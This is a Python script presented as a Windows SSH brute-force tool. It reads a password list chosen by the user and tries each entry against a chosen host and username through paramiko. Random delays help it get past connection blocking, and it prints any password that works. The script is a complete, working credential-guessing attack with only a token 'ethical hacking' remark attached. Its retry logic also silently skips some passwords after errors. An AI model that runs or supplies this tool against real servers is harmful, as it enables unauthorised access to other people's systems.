import paramiko
import time
import random
from tkinter import filedialog

import paramiko.ssh_exception
print("Windows SSH brute force by Breno v1.0")
print("Please consider using this program for ethinical hacking")
print("please select a password list file")
Tryagain = 0
tried = 0
while True:
    bruitForceList = filedialog.askopenfilename()
    if bruitForceList:
        pass
    else:
        print("You dont choose a password list file")
        print("Aborting")
        exit()
    user = input("Type username :")
    host = input("Type host IP :")
    with open(bruitForceList, "r") as file:
        content = file.read()
        contentSplited = content.splitlines()
        for i in range(len(contentSplited)):
            try:
                Tryagain = random.randint(1, 5)
                if tried>=1:
                    time.sleep(Tryagain)
                    tried = 0
                else:
                    sshTry = paramiko.SSHClient()
                    sshTry.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    sshTry.connect(host, username=user, password=contentSplited[i])
                    sshTry.exec_command("echo hello")
                    sshTry.close()
                    time.sleep(Tryagain)
                    print("PASSWORD FOUND! Password :"+contentSplited[i])
                    break
            except paramiko.AuthenticationException as error:
                print("Password "+contentSplited[i]+" not worked")
                time.sleep(Tryagain)
            except Exception as e:
                print("Target blocked connection, tries limit exceded or other problem")
                print("Next password try in "+str(Tryagain)+" seconds")
                tried += 1
                